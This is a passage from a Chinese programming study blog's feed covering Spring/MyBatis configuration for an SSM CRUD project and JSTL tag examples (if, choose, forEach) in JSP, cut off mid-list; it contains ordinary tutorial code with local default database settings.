class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driverClass"</span>  <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;jdbc.driverClass&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"user"</span>  <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;jdbc.user&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;jdbc.password&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 配置MyBatis的整合   --&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"SqlSessionFactory"</span> <span class="attr">class</span>=<span class="string">"org.mybatis.spring.SqlSessionFactoryBean"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="comment">&lt;!-- 指定mybatis全局配置文件的位置 --&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"configLocation"</span> <span class="attr">value</span>=<span class="string">"classpath:mybatis-config.xml"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"pooleDataSource"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="comment">&lt;!--  指定mybatis.mapper文件位置      --&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mapperLocations"</span> <span class="attr">value</span>=<span class="string">"classpath:mapper/*.xml"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">    <span class="comment">&lt;!-- 配置扫描器，将mybatis接口的实现加入到ioc容器中   --&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.mybatis.spring.mapper.MapperScannerConfigurer"</span> &gt;</span></span></span><br><span class="line"><span class="xml">        <span class="comment">&lt;!--   扫描所有dao接口的实现，加入到ioc容器中     --&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"basePackage"</span> <span class="attr">value</span>=<span class="string">"com.ceit.crud.dao"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--  事务控制  --&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"transactionManager"</span> <span class="attr">class</span>=<span class="string">"org.springframework.jdbc.datasource.DataSourceTransactionManager"</span> &gt;</span></span></span><br><span class="line"><span class="xml">    <span class="comment">&lt;!-- 控制住数据源   --&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"pooleDataSource"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="comment">&lt;!-- 开启基于注解的事务，使用xml配置形式的事务(必要主要的都是使用配置式)   --&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="comment">&lt;!-- 切入点表达式--&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">"txPoint"</span> <span class="attr">expression</span>=<span class="string">"execution(* com.ceit.crud.service..*(..))"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="comment">&lt;!-- 配置事务增强   --&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">"txAdvice"</span>  <span class="attr">pointcut-ref</span>=<span class="string">"txPoint"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--  配置事务增强，事务如何切入  --&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">"txAdvice"</span> <span class="attr">transaction-manager</span>=<span class="string">"transactionManager"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="comment">&lt;!--  所有方法都是事务方法  --&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"*"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="comment">&lt;!--   get开始的所有方法   --&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"get*"</span> <span class="attr">read-only</span>=<span class="string">"true"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--  Spring配置文件的核心点(数据源，与mybatis的整合，事务控制)  --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br><img src="/img/JavaWeb/9-17学习日记/3.png" alt="avatar"></p>
<h3 id="MyBatis及逆向工程配置文件"><a href="#MyBatis及逆向工程配置文件" class="headerlink" title="MyBatis及逆向工程配置文件"></a>MyBatis及逆向工程配置文件</h3><p>首先配置mybatis-config.xml<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE configuration</span></span><br><span class="line"><span class="meta">        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"</span></span><br><span class="line"><span class="meta">        "http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">"mapUnderscoreToCamelCase"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"com.ceit.crud.bean"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>接着在maven中添加插件<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--  mybatis      --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.generator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-generator-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">          <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configurationFile</span>&gt;</span>src/main/resources/generatorConfig.xml<span class="tag">&lt;/<span class="name">configurationFile</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">verbose</span>&gt;</span>true<span class="tag">&lt;/<span class="name">verbose</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">overwrite</span>&gt;</span>true<span class="tag">&lt;/<span class="name">overwrite</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line">          <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">id</span>&gt;</span>Generate MyBatis Artifacts<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">goal</span>&gt;</span>generate<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><br>还需要添加mybatis的依赖<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- mybatis generator   --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.generator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-generator-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>接着创建generatorConfig.xml<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE generatorConfiguration</span></span><br><span class="line"><span class="meta">        PUBLIC "-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN"</span></span><br><span class="line"><span class="meta">        "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">generatorConfiguration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 数据库驱动:选择你的本地硬盘上面的数据库驱动包--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">classPathEntry</span> <span class="attr">location</span>=<span class="string">"C:\Users\songf\.m2\repository\mysql\mysql-connector-java\8.0.11\mysql-connector-java-8.0.11.jar"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context</span> <span class="attr">id</span>=<span class="string">"DB2Tables"</span> <span class="attr">targetRuntime</span>=<span class="string">"MyBatis3"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suppressDate"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 是否去除自动生成的注释 true：是 ： false:否 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suppressAllComments"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--数据库链接URL，用户名、密码 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdbcConnection</span> <span class="attr">driverClass</span>=<span class="string">"com.mysql.cj.jdbc.Driver"</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">connectionURL</span>=<span class="string">"jdbc:mysql://localhost:3306/ssm_crud?useSSL=false&amp;amp;serverTimezone=UTC"</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">userId</span>=<span class="string">"root"</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">password</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">jdbcConnection</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaTypeResolver</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"forceBigDecimals"</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaTypeResolver</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 生成模型的包名和位置--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaModelGenerator</span> <span class="attr">targetPackage</span>=<span class="string">"com.ceit.crud.bean"</span> <span class="attr">targetProject</span>=<span class="string">"src/main/java"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"enableSubPackages"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"trimStrings"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaModelGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 生成映射文件的包名和位置--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sqlMapGenerator</span> <span class="attr">targetPackage</span>=<span class="string">"mapper"</span> <span class="attr">targetProject</span>=<span class="string">"src/main/resources"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"enableSubPackages"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">sqlMapGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 生成DAO的包名和位置--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaClientGenerator</span> <span class="attr">type</span>=<span class="string">"XMLMAPPER"</span> <span class="attr">targetPackage</span>=<span class="string">"com.ceit.crud.dao"</span> <span class="attr">targetProject</span>=<span class="string">"src/main/java"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"enableSubPackages"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaClientGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 要生成的表 tableName是数据库中的表名或视图名 domainObjectName是实体类名--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;table tableName="dicom_file" domainObjectName="DicomFile" enableCountByExample="false" enableUpdateByExample="false" enableDeleteByExample="false" enableSelectByExample="false" selectByExampleQueryId="false"/&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">tableName</span>=<span class="string">"tbl_emp"</span> <span class="attr">domainObjectName</span>=<span class="string">"Employee"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">tableName</span>=<span class="string">"tbl_dept"</span> <span class="attr">domainObjectName</span>=<span class="string">"Department"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">generatorConfiguration</span>&gt;</span></span><br></pre></td></tr></table></figure><br>刷新maven启动就行</p>
<p>注意：generatorConfig.xml在IDEA环境中必须放在resources中</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>SSM</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb-2020/9/7-JSTL</title>
    <url>/2020/09/07/JavaWeb-2020-9-7-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p><del>鸽了一个月，我又回来了</del></p>
<h1 id="JSTL"><a href="#JSTL" class="headerlink" title="JSTL"></a>JSTL</h1><ol>
<li><p>概念：JavaServer Pages Tag Library  JSP标准标签库</p>
<ul>
<li>是由Apache组织提供的开源的免费的jsp标签</li>
</ul>
</li>
<li><p>作用：用于简化和替换jsp页面上的java代码</p>
</li>
<li><p>使用步骤</p>
<ol>
<li><p>导入jar包</p>
</li>
<li><p>引入标签库：taglib指令：&lt;%@ taglib %></p>
</li>
<li><p>使用标签</p>
</li>
</ol>
</li>
</ol>
<h2 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h2><ol>
<li><p>if：相当于Java代码的if语句</p>
</li>
<li><p>choose：相当于Java代码的switch语句</p>
</li>
<li><p>foreach：相当于Java代码的for语句</p>
</li>
</ol>
<h3 id="if标签"><a href="#if标签" class="headerlink" title="if标签"></a>if标签</h3><ol>
<li><p>属性：</p>
<ul>
<li><p>test 必须属性：接受boolean表达式</p>
<ul>
<li><p>如果表达式为true，则显示if标签体内容，如果为false，则不显示标签体内容</p>
</li>
<li><p>一般情况下，test属性会结合el表达式一起使用</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>注意：c:if标签没有else情况，想要else情况，则可以再定义一个c:if标签</p>
</li>
</ol>
<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">import</span>=<span class="string">"java.util.ArrayList"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">import</span>=<span class="string">"java.util.List"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">isELIgnored</span>=<span class="string">"false"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"c"</span> <span class="attr">uri</span>=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>if标签<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span></span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">c:if标签</span></span><br><span class="line"><span class="xml">  1. 属性：</span></span><br><span class="line"><span class="xml">    · test 必须属性：接受boolean表达式</span></span><br><span class="line"><span class="xml">      · 如果表达式为true，则显示if标签体内容，如果为false，则不显示标签体内容</span></span><br><span class="line"></span><br><span class="line"><span class="xml">      ` 一般情况下，test属性会结合el表达式一起使用</span></span><br><span class="line"></span><br><span class="line"><span class="xml">   2. 注意：c:if标签没有else情况，想要else情况，则可以再定义一个c:if标签</span></span><br><span class="line"><span class="xml">--%&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"true"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        我是真...</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="xml">        //判断request域中的一个list集合是否为空，如果不为null则显示遍历集合</span></span><br><span class="line"><span class="xml">        List list=new ArrayList<span class="tag">&lt;&gt;</span>();</span></span><br><span class="line"><span class="xml">        list.add("aaaa");</span></span><br><span class="line"><span class="xml">        request.setAttribute("list",list);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        request.setAttribute("number",3);</span></span><br><span class="line"><span class="xml">    %&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;not empty list&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        遍历集合...</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;number %2 !=0&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        $</span><span class="template-variable">&#123;number&#125;</span><span class="xml">为奇数</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;number %2 ==0&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        $</span><span class="template-variable">&#123;number&#125;</span><span class="xml">为偶数</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><img src="/img/JavaWeb/9-7学习日记/0.png" alt="avatar"></p>
<h3 id="choose标签"><a href="#choose标签" class="headerlink" title="choose标签"></a>choose标签</h3><ul>
<li><p>完成数字编号对应星期几案例</p>
<ol>
<li><p>域中存储一个数字</p>
</li>
<li><p>使用choose标签取出数字  相当于switch声明</p>
</li>
<li><p>使用when标签做数字判断  相当于case</p>
</li>
<li><p>otherwise标签做其他情况的声明  相当于default</p>
</li>
</ol>
</li>
</ul>
<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">isELIgnored</span>=<span class="string">"false"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"c"</span> <span class="attr">uri</span>=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>choose标签<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span></span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">完成数字编号对应星期几案例</span></span><br><span class="line"><span class="xml">    1. 域中存储一个数字</span></span><br><span class="line"><span class="xml">    2. 使用choose标签取出数字  相当于switch声明</span></span><br><span class="line"><span class="xml">    3. 使用when标签做数字判断  相当于case</span></span><br><span class="line"><span class="xml">    4. otherwise标签做其他情况的声明  相当于default</span></span><br><span class="line"><span class="xml">--%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="xml">        request.setAttribute("number",3);</span></span><br><span class="line"><span class="xml">    %&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">c:choose</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">c:when</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;number==1&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>星期一<span class="tag">&lt;/<span class="name">c:when</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">c:when</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;number==2&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>星期二<span class="tag">&lt;/<span class="name">c:when</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">c:when</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;number==3&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>星期三<span class="tag">&lt;/<span class="name">c:when</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">c:when</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;number==4&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>星期四<span class="tag">&lt;/<span class="name">c:when</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">c:when</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;number==5&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>星期五<span class="tag">&lt;/<span class="name">c:when</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">c:when</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;number==6&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>星期六<span class="tag">&lt;/<span class="name">c:when</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">c:when</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;number==7&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>星期天<span class="tag">&lt;/<span class="name">c:when</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">c:otherwise</span>&gt;</span>数字输入有误<span class="tag">&lt;/<span class="name">c:otherwise</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">c:choose</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><img src="/img/JavaWeb/9-7学习日记/1.png" alt="avatar"></p>
<h3 id="foreach标签"><a href="#foreach标签" class="headerlink" title="foreach标签"></a>foreach标签</h3><ul>
<li><p>foreach相当于Java代码的for循环</p>
<ol>
<li><p>完成重复的操作</p>
<ul>
<li><p>属性：</p>
<ul>
<li><p>begin:开始值</p>
</li>
<li><p>end:结束值</p>
</li>
<li><p>var:临时变量</p>
</li>
<li><p>step:步长</p>
</li>
<li><p>varStatus:循环状态对象</p>
<ul>
<li><p>index:容器中元素的索引从0开始</p>
</li>
<li><p>count:循环次数从1开始</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
